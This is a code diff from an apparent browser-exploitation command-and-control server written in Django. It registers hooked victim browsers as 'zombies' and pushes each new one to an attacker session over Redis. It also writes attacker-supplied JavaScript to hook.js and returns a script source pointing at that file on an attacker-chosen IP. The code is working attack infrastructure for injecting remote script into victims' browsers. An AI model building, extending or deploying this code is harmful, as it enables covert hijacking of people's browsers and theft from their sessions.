@@ -19,23 +19,29 @@ import os
 
 Zombies = []
 
+
 class ZombieConnection(View):
 
     global Zombies
     def get(self,request,**kwargs):
 
 
-        #pdb.set_trace()
+
         try:
             zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
         except Zombie.DoesNotExist:
-            Zombie.objects.create(host=request.META['HTTP_HOST'])
+            newZombie = Zombie.objects.create(host=request.META['HTTP_HOST'])
+            redis_publisher = RedisPublisher(facility='solo',sessions=[Attack.objects.all()[0].sesskey])
+            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'newzombieId':newZombie.pk,'newzombieHost':newZombie.host})))
         if not request.session.exists(request.session.session_key):
             request.session.create()
         zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
         zom.sesskey = request.session.session_key
         zom.save()
         Zombies.append(zom)
+
+
+
 
         response=HttpResponse(simplejson.dumps("{'lol':lol'};"),'application/json')
 
@@ -118,6 +124,6 @@ class InjectionCreate(View):
             try:
                 with open(os.getcwd()+"/hook.js",'w+') as f:
                         f.write(injection)
-                        return HttpResponse(simplejson.dumps({'resp':"<script src=\"http://"+ip+"/2000/hook.js\""+"></script>"}),'application/json')
+                        return HttpResponse(simplejson.dumps({'resp':"src=\"http://"+ip+"/2000/hook.js\""}),content_type='application/json')
             except IOError as e:
                 return HttpResponse(e)
